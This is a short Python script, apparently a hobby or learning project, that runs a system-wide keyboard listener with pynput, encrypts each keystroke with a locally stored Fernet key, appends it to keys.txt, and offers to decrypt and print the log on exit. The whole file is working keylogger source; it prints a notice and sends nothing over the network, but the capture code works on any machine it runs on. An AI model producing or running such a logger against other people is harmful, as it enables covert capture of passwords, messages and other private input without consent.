from pynput import keyboard
from cryptography.fernet import Fernet
import os

# Generate or load the encryption key
key_file = "encryption_key.key"

if os.path.exists(key_file):
    # Load the existing key
    with open(key_file, "rb") as file:
        key = file.read()
else:
    # Generate a new key and save it
    key = Fernet.generate_key()
    with open(key_file, "wb") as file:
        file.write(key)

cipher_suite = Fernet(key)

# Function to handle key press events
def key_logger(key):
    try:
        # Convert the key to a string
        key_str = key.char
    except AttributeError:
        # Handle special keys
        key_str = str(key)

    # Encrypt the keystroke
    encrypted_data = cipher_suite.encrypt(key_str.encode())

    # Write the encrypted keystroke to a log file
    with open("keys.txt", "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

    # Check if the key is 'Esc' to stop the listener
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Function to decrypt the log file
def decrypt_log_file():
    try:
        with open("keys.txt", "rb") as log_file:
            encrypted_lines = log_file.readlines()

        print("Decrypted Keystrokes:")
        for encrypted_line in encrypted_lines:
            # Decrypt each line and decode to a readable string
            decrypted_data = cipher_suite.decrypt(encrypted_line.strip())
            print(decrypted_data.decode(), end="")
    except FileNotFoundError:
        print("Log file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Start listening to keystrokes
print("Press 'Esc' to stop logging.")
with keyboard.Listener(on_press=key_logger) as listener:
    listener.join()

# Option to decrypt the log file
decrypt_option = input("\nDo you want to decrypt the log file? (yes/no): ").strip().lower()
if decrypt_option == "yes":
    decrypt_log_file()
